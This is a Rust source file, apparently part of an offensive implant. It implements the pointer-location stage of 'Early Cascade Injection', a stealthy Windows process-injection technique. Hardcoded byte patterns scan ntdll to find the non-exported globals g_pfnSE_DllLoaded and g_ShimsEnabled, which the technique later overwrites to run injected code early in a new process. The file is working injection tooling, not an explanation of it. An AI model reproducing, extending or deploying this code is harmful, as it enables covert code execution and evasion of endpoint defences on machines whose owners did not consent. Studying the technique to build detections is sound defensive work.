use core::{ffi::c_void, ptr::read_unaligned, slice::from_raw_parts};

use crate::export_resolver;

/// Byte pattern found from disassembling ntdll to hunt for the mapped address of g_pfnSE_DllLoaded,
/// a non-exported global variable in ntdll.
/// https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/
#[rustfmt::skip]
const G_PFNSE_DLLLOADED_PATTERN: &[u8] = &[
    0x48, 0x8b, 0x3d, 0xd0, 0xc3, 0x12, 0x00,   // mov  rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (############)]
    0x83, 0xe0, 0x3f,                           // and  eax, 3Fh
    0x44, 0x2b, 0xe0,                           // sub  r12d, eax
    0x8b, 0xc2,                                 // mov  eax, edx
    0x41, 0x8a, 0xcc                            // mov  cl, r12b
];

/// Byte pattern found from disassembling ntdll to hunt for the mapped address of g_ShimsEnabled,
/// a non-exported global variable in ntdll.
/// https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/
#[rustfmt::skip]
const G_SHIMS_ENABLED_PATTERN: &[u8] = &[
    0xe8, 0x33, 0x38, 0xf5, 0xff,               // call ntdll!RtlEnterCriticalSection (7ff9ddead780)
    0x44, 0x38, 0x2d, 0xe4, 0x84, 0x11, 0x00,   // cmp  byte ptr [ntdll!g_ShimsEnabled (7ff9de072438)], r13b
    0x48, 0x8d, 0x35, 0x95, 0x89, 0x11, 0x00,   // lea  rsi, [ntdll!PebLdr+0x10 (7ff9de0728f0)]
];

pub enum ShimErrors {
    NtdllNotFound(u32),
    GetModuleInformationFailed(u32),
    ExternDllLoadedNotFound,
    ExternShimsEnabledNotFound,
    ExternLdrLoadShimNotFound,
}

#[inline(always)]
pub fn locate_shim_pointers() -> Result<EarlyCascadePointers, ShimErrors> {
    const MAX_TEXT_SECTION_SEARCH: usize = 1_500_000;

    //
    // Take a function at the beginning of the .text section and scan through a reasonable search number until we hopefully reach our selected
    // bytes..
    //
    let Ok(approx_ntdll_base) =
        export_resolver::resolve_address("ntdll.dll", "RtlCompareString", None)
    else {
        return Err(ShimErrors::ExternLdrLoadShimNotFound);
    };

    // Get the address of the .text section containing the machine code for loading the value at
    // g_pfnSE_DllLoaded
    let Ok(p_text_g_pfnse_dll_loaded) = scan_module_for_byte_pattern(
        approx_ntdll_base,
        MAX_TEXT_SECTION_SEARCH,
        G_PFNSE_DLLLOADED_PATTERN,
    ) else {
        return Err(ShimErrors::ExternDllLoadedNotFound);
    };

    // Now get the actual address
    let p_g_pfnse_dll_loaded = unsafe {
        const INSTRUCTION_LEN: isize = 7;

        // Offset by 3 bytes to get the imm, and read the imm as a 4 byte value
        let offset = read_unaligned((p_text_g_pfnse_dll_loaded as *const u8).add(3) as *const i32);
        let offset = offset as isize + INSTRUCTION_LEN;

        (p_text_g_pfnse_dll_loaded as isize + offset) as *mut c_void
    };

    //
    // Do the same for g_ShimsEnabled
    //
    let Ok(p_text_shims_enabled) = scan_module_for_byte_pattern(
        approx_ntdll_base,
        MAX_TEXT_SECTION_SEARCH,
        G_SHIMS_ENABLED_PATTERN,
    ) else {
        return Err(ShimErrors::ExternShimsEnabledNotFound);
    };

    let p_g_shims_enabled = unsafe {
        const OFFSET_FROM_PATTERN: usize = 5;
        const OFFSET_IMM: usize = 3;
        const INSTRUCTION_LEN: isize = 7;

        // Offset by 3 bytes to get the imm, and read the imm as a 4 byte value
        let offset = read_unaligned(
            (p_text_shims_enabled as *const u8).add(OFFSET_FROM_PATTERN + OFFSET_IMM) as *const i32,
        );
        let offset = offset as isize + INSTRUCTION_LEN;

        (p_text_shims_enabled as isize + offset + OFFSET_FROM_PATTERN as isize) as *mut u8
    };

    Ok(EarlyCascadePointers {
        p_g_pfnse_dll_loaded,
        p_g_shims_enabled,
    })
}

pub struct EarlyCascadePointers {
    pub p_g_pfnse_dll_loaded: *mut c_void,
    /// Bool (single byte according to the disasm - byte ptr)
    pub p_g_shims_enabled: *mut u8,
}

/// Scan a loaded module for a particular sequence of bytes, this will most commonly be used to resolve a pointer to
/// an unexported function we wish to use.
///
/// # Args
/// - `image_base`: The base address of the image you wish to search
/// - `image_size`: The total size of the image to search
/// - `pattern`: A byte slice containing the bytes you wish to search for
///
/// # Returns
/// - `ok`: The address of the start of the pattern match
/// - `err`: An empty error signifying the pattern was not found.
#[inline(always)]
pub fn scan_module_for_byte_pattern(
    image_base: *const c_void,
    image_size: usize,
    pattern: &[u8],
) -> Result<*const c_void, ()> {
    // Convert the raw address pointer to a byte pointer so we can read individual bytes
    let image_base = image_base as *const u8;
    let mut cursor = image_base as *const u8;
    // End of image denotes the end of our reads, if nothing is found by that point we have not found the
    // sequence of bytes
    let end_of_image = unsafe { image_base.add(image_size) };

    while cursor != end_of_image {
        unsafe {
            let bytes = from_raw_parts(cursor, pattern.len());

            if bytes == pattern {
                return Ok(cursor as *const _);
            }

            cursor = cursor.add(1);
        }
    }

    Err(())
}
